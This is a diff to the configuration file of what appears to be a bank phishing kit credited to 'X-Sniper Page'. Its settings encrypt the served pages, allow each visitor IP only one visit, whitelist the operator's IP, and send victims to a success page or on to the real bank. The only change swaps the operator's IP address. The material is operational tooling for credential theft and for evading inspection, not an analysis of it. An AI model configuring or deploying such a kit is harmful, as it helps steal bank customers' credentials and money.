@@ -43,7 +43,7 @@ Copyright all Reserved to X-Sniper Page
 		$encrypt_html = "true"; // If you don`t want to encrypt pages hange from true to false
 	// ================================= //
 		$accessOneTimeIp = "true"; // Access one Time by ip
-		$yourIPAceess = "107.150.19.195"; // Allow Your Ip To Enter More than One Time
+		$yourIPAceess = "185.246.128.82 "; // Allow Your Ip To Enter More than One Time
 	// ========= Pages =========== //
 		$Block_page = "false"; //Show Block Page 2nd page => true / false
 		$success_page = "true";  //Show Success Page or Redirect to Bank    => true Or false
